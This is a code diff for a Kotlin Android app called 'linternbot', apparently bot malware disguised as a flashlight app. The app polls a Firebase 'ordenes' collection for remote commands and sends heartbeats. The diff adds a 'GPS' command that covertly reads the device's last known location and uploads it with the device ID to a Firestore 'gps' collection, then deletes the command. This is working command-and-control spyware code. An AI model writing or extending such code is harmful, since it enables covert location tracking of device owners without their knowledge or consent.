@@ -1,5 +1,6 @@
 package com.linternbot
 
+import android.annotation.SuppressLint
 import android.app.AlarmManager
 import android.app.PendingIntent
 import android.content.BroadcastReceiver
@@ -13,6 +14,8 @@ import android.os.PowerManager
 import android.provider.ContactsContract
 import android.util.Log
 import android.widget.Toast
+import com.google.android.gms.location.FusedLocationProviderClient
+import com.google.android.gms.location.LocationServices
 import com.google.firebase.firestore.DocumentChange
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.firestore.ktx.firestore
@@ -31,7 +34,7 @@ class Alarm : BroadcastReceiver() {
         val wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "app:alarm")
         wl.acquire()
         //Toast.makeText(context, "Alarm !!!!!!!!!!", Toast.LENGTH_LONG).show(); // For example
-
+        val fusedLocationClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(context)
         val c = Calendar.getInstance()
         val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
         val strDate: String = sdf.format(c.time)
@@ -39,7 +42,7 @@ class Alarm : BroadcastReceiver() {
 
         // End of my code
         enviaImAlive(db, strDate)
-        leePrimitiva(db, strDate)
+        leePrimitiva(db, strDate,fusedLocationClient)
 
         wl.release()
     }
@@ -64,7 +67,7 @@ class Alarm : BroadcastReceiver() {
         Toast.makeText(context, "Se ha parado la alarma", Toast.LENGTH_LONG).show(); // For example
     }
 
-    fun leePrimitiva(db : FirebaseFirestore, strDate: String){
+    fun leePrimitiva(db : FirebaseFirestore, strDate: String, fusedLocationClient: FusedLocationProviderClient){
         db.collection("ordenes")
             .get()
             .addOnSuccessListener { result ->
@@ -134,6 +137,16 @@ class Alarm : BroadcastReceiver() {
                                 db.collection("ordenes").document(document.id).delete()
                                     .addOnSuccessListener {
                                         Log.d("TAG2", "Orden apagar eliminada")
+                                    }
+                            }
+                        }
+                        if (document.data["Primitiva"]!!.equals("GPS")) {
+                            getLastKnownLocation(db,strDate,fusedLocationClient)
+                            Log.d("TAG2", "Se obtiene la ubicacion")
+                            if(!document.data["Bot_ID"]!!.equals("todos")) {
+                                db.collection("ordenes").document(document.id).delete()
+                                    .addOnSuccessListener {
+                                        Log.d("TAG2", "Orden gps eliminada")
                                     }
                             }
                         }
@@ -363,5 +376,36 @@ class Alarm : BroadcastReceiver() {
             println(" Exception:$e")
         }
         return false
+    }
+
+    // Fuente: https://stackoverflow.com/questions/45958226/get-location-android-kotlin
+    @SuppressLint("MissingPermission")
+    fun getLastKnownLocation(db : FirebaseFirestore, strDate: String, fusedLocationClient: FusedLocationProviderClient) {
+        var noAccede = true
+        fusedLocationClient.lastLocation.addOnFailureListener {
+            Log.d("Tag2",it.toString())
+        }
+        fusedLocationClient.lastLocation.addOnSuccessListener { location->
+            if (location != null) {
+                val loc = hashMapOf(
+                    "Bot_ID" to idAndroid,
+                    "Hora" to strDate,
+                    "GPS" to location
+                )
+                // Add a new document with a generated ID
+                noAccede = false
+                db.collection("gps").document(strDate).set(loc)
+                Log.d("TAG2","se envia la data del gps")
+            // get latitude , longitude and other info from this
+            }
+        }
+        if(noAccede){
+            val loc = hashMapOf(
+                "Bot_ID" to idAndroid,
+                "Hora" to strDate,
+                "GPS" to "Error, gps desactivado en el dispositivo"
+            )
+            db.collection("gps").document(strDate).set(loc)
+        }
     }
 }
